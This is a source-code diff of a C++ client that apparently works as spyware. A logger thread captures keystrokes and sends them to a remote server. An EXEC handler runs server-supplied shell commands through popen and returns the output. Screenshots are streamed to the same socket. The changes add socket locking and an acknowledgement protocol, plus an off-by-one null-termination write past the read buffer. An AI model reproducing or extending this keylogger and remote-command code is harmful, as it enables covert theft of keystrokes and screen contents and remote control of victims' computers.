@@ -2,7 +2,7 @@
 * @Author: amaneureka
 * @Date:   2017-04-02 03:33:49
 * @Last Modified by:   amaneureka
-* @Last Modified time: 2017-04-06 12:14:41
+* @Last Modified time: 2017-04-06 20:00:36
 */
 
 #include <vector>
@@ -98,22 +98,41 @@ char keycodes[] =
     VK_DIVIDE
 };
 
+bool command_ack = false;
+pthread_mutex_t mutex_socket;
+int send_request(int socket, const char *buffer, int size, bool applylock)
+{
+    int status = 0, wait = 3;
+
+    /* do we need to apply lock? */
+    if (applylock) pthread_mutex_lock(&mutex_socket);
+
+    command_ack = false;
+    write(socket, buffer, size);
+
+    while(!command_ack && wait-- > 0)
+        sleep(10);
+
+    status = command_ack == true;
+
+    if (applylock) pthread_mutex_unlock(&mutex_socket);
+    return status;
+}
+
 void *logger(void *args)
 {
     int i, index = 3;
-    int sock = *(int*)args;
+    int socket = *(int*)args;
+    vector<char> buffer(100);
 
-    char buffer[100] = "SAV";
+    sprintf(buffer.data(), "SAV");
     while(true)
     {
         // maximum of 3 entries can be made in a single loop so 1020
         if (index >= 90)
         {
-            /* wait until we are logged in */
-            while(!logged_in) sleep(100);
-
             /* send data */
-            write(sock, buffer, index);
+            send_request(socket, buffer.data(), index, true);
 
             /* reset buffer */
             index = 3;
@@ -176,73 +195,38 @@ void register_device(int socket, string recv_uid)
 
 void execute_cmd(int socket, const string cmd)
 {
+    int len;
     FILE *pPipe;
-    char buffer[128] = "RSP-1";
+    char buffer[150];
 
     fflush(stdin);
     pPipe = popen(cmd.c_str(), "r");
     if (pPipe == NULL)
     {
-        write(socket, buffer, 5);
+        sprintf(buffer, "RSP%07dFailed to create pipe!", 0);
+        send_request(socket, buffer, strlen(buffer), true);
         return;
     }
 
+    /* we want this data to be contigous */
+
+    // lock socket write stream
+    pthread_mutex_lock(&mutex_socket);
+
     string str;
-    while(fgets(buffer + 3, 125, pPipe))
+    while(fgets(buffer, 128, pPipe))
     {
         str = buffer;
-        write(socket, str.c_str(), str.size());
+        len = strlen(buffer) + 10;
+        sprintf(buffer, "RSP%07d%s", len, str.c_str());
+        send_request(socket, buffer, len, false);
     }
+
+    // unlock socket write stream
+    pthread_mutex_unlock(&mutex_socket);
 
     pclose(pPipe);
     return;
-}
-
-const char BASE64_CODE[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
-void convert_and_send(int socket, void *mem, int size)
-{
-    int index = 3;
-    char buffer[2000] = "RSP";
-    BYTE* data = (BYTE*)mem;
-    for (int i = 0; i < size; i += 3)
-    {
-        if (index >= 2000)
-        {
-            write(socket, buffer, index);
-            index = 3;
-            sleep(100);
-        }
-
-        int d = data[i];
-        buffer[index++] = BASE64_CODE[d >> 2];
-        d = (d & 0x3) << 4;
-        if (i + 1 < size)
-        {
-            d |= data[i + 1] >> 4;
-            buffer[index++] = BASE64_CODE[d];
-
-            d = (data[i + 1] & 0xF) << 2;
-            if (i + 2 < size)
-            {
-                d |= data[i + 2] >> 6;
-                buffer[index++] = BASE64_CODE[d];
-                buffer[index++] = BASE64_CODE[data[i + 2] & 0x3F];
-            }
-            else
-            {
-                buffer[index++] = BASE64_CODE[d];
-                buffer[index++] = '=';
-            }
-        }
-        else
-        {
-            buffer[index++] = BASE64_CODE[d];
-            buffer[index++] = '=';
-        }
-    }
-
-    if (index > 3)
-        write(socket, buffer, index);
 }
 
 /* https://msdn.microsoft.com/en-us/library/windows/desktop/ms533843(v=vs.85).aspx */
@@ -319,23 +303,33 @@ void get_screenshot(int socket)
     pStream->Seek(liZero, STREAM_SEEK_SET, &pos);
     pStream->Stat(&stg, STATFLAG_NONAME);
 
+    char buffer[1024];
     ULONG bytesRead = 0;
-    char buffer[1024] = "RSP";
     int size2read = stg.cbSize.LowPart;
 
+    sprintf(buffer, "RSP%07d", size2read + 10);
+
+    /* we want this data to be contigous */
+
+    // lock socket write stream
+    pthread_mutex_lock(&mutex_socket);
+
+    send_request(socket, buffer, strlen(buffer), false);
     for (int i = 0; i < size2read; i += 1000)
     {
-        pStream->Read(buffer + 3, 1000, &bytesRead);
-        write(socket, buffer, bytesRead + 3);
-        sleep(10);
+        pStream->Read(buffer, 1000, &bytesRead);
+        send_request(socket, buffer, bytesRead, false);
     }
+
+    // unlock socket write stream
+    pthread_mutex_unlock(&mutex_socket);
 }
 
 int main(int argc, char *argv[])
 {
-    int sock;
+    int sock, len;
     string cmd, req;
-    vector<char> buffer(4096);
+    vector<char> buffer(1030);
     struct sockaddr_in addr;
     fd_set active_fd_set, read_fd_set;
 
@@ -374,6 +368,7 @@ int main(int argc, char *argv[])
     //FD_SET(0, &active_fd_set);
 
     /* start background tasks */
+    pthread_mutex_init(&mutex_socket, NULL);
     pthread_create(&logger_thread, NULL, &logger, &sock);
 
     while(true)
@@ -392,11 +387,14 @@ int main(int argc, char *argv[])
             {
                 if (i == sock)
                 {
-                    if (read(sock, buffer.data(), buffer.size()) <= 0)
+                    if ((len = read(sock, buffer.data(), buffer.size())) <= 0)
                     {
                         printf("\ndisconnected from the server\n");
                         exit(0);
                     }
+
+                    // null termination
+                    buffer[len] = 0;
 
                     cmd = buffer.data();
                     req = cmd.substr(0, 3);
@@ -453,6 +451,11 @@ int main(int argc, char *argv[])
                         else if (req == "EXEC")
                             /* command to execute */
                             execute_cmd(sock, cmd.substr(7));
+                    }
+                    else if (req == "ACK")
+                    {
+                        /* set ack status flag */
+                        command_ack = true;
                     }
                 }
             }
